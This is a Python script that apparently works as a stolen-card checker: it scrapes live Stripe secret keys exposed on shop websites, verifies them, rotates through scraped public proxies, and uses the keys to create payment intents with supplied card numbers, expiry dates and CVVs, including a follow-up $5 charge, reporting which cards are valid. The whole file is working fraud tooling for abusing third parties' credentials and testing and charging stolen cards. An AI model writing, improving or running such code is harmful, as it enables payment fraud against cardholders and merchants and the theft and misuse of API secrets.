import requests
import random
import re
import aiohttp
import asyncio
from luhn import is_valid
from bs4 import BeautifulSoup
from config import PROXY_SOURCES, SHOP_LIST

proxies = []
keys = []  # SKs obfuscated
lock = asyncio.Lock()

async def refresh_proxies():
    global proxies
    all_px = []
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            all_px.extend([p.strip() for p in r.text.split('\n') if ':' in p])
        except: pass
    all_px = list(set(all_px))[:1000]
    
    live_px = []
    async with aiohttp.ClientSession() as session:
        tasks = [test_px(session, px) for px in all_px[:200]]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        live_px = [r for r in results if isinstance(r, str)]
    proxies = live_px[:50]
    print(f"Updated: {len(proxies)} proxies ready")

async def test_px(session, px):
    try:
        proxy_url = f"http://{px}"
        async with session.get("http://httpbin.org/ip", proxy=proxy_url, timeout=5) as r:
            return px if r.status == 200 else None
    except: return None

async def scrape_keys():
    global keys
    new_keys = []
    async with aiohttp.ClientSession() as session:
        shops = random.sample(SHOP_LIST, min(6, len(SHOP_LIST)))
        for shop in shops:
            try:
                async with session.get(shop, timeout=10) as r:
                    if r.status == 200:
                        txt = await r.text()
                        found = re.findall(r'sk_live_[0-9a-zA-Z]+', txt)
                        new_keys.extend(set(found))
                        soup = BeautifulSoup(txt, 'html.parser')
                        for script in soup.find_all('script'):
                            if script.string:
                                found = re.findall(r'sk_live_[0-9a-zA-Z]+', script.string)
                                new_keys.extend(set(found))
            except: pass
    live_new = [k async for k in new_keys[:15] if await test_key(k)]
    if live_new:
        keys.extend(live_new)
        keys = keys[-25:]
        print(f"New keys: {len(live_new)} added. Total: {len(keys)}")

async def test_key(key):
    try:
        h = {'Authorization': f'Bearer {key}'}
        r = requests.post('https://api.stripe.com/v1/payment_intents', headers=h, data={'amount':'1'}, timeout=10)
        return r.status_code < 403
    except: return False

async def get_proxies():
    if not proxies: await refresh_proxies()
    return proxies or ['']

async def get_keys():
    if not keys: await scrape_keys()
    return keys or ['sk_live_test']

async def bin_info(bin_num):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://binlist.net/json/{bin_num}') as r:
                if r.status == 200:
                    data = await r.json()
                    scheme = data.get('scheme', '').lower()
                    return 'visa' in scheme or 'mastercard' in scheme, data.get('bank', {}).get('name', 'Unknown')
    except: pass
    return False, 'Unknown'

async def process_data(data_str):
    parts = re.split(r'[\|/ ]', data_str.strip())
    if len(parts) < 4: return "Invalid format: num|mm|yy|cvv"
    num, mm, yy, cvv = parts[:4]
    
    if not is_valid(num) or not (1 <= int(mm) <= 12) or int(yy) < 26:
        return "Invalid Luhn/format"
    
    bin6 = num[:6]
    valid_bin, bank = await bin_info(bin6)
    if not valid_bin: return f"Bad BIN {bin6} ({bank})"
    
    px = random.choice(await get_proxies()) if proxies else None
    px_dict = {'http': f'http://{px}', 'https': f'http://{px}'} if px else None
    
    curr_keys = await get_keys()
    for key in curr_keys[:]:
        try:
            post_data = {
                'amount': '100', 'currency': 'usd',
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': num,
                'payment_method_data[card][exp_month]': mm,
                'payment_method_data[card][exp_year]': f'20{yy}',
                'payment_method_data[card][cvc]': cvv,
            }
            headers = {'Authorization': f'Bearer {key}', 'Content-Type': 'application/x-www-form-urlencoded'}
            resp = requests.post('https://api.stripe.com/v1/payment_intents', data=post_data, proxies=px_dict, headers=headers, timeout=15)
            if resp.status_code == 200 and 'requires_action' not in resp.text.lower():
                # Process $5
                killer_data = post_data.copy(); killer_data['amount'] = '500'
                killer_resp = requests.post('https://api.stripe.com/v1/payment_intents', data=killer_data, proxies=px_dict, headers=headers, timeout=15)
                status = " | PROCESSED $5 ✅" if killer_resp.status_code == 200 else " | VALID AUTH"
                if not await test_key(key): keys.remove(key)
                return f"VALID [gate1] {bank} | BIN:{bin6}{status}"
        except:
            if key in keys: keys.remove(key)
            continue
    return "All failed - Auto refresh active"

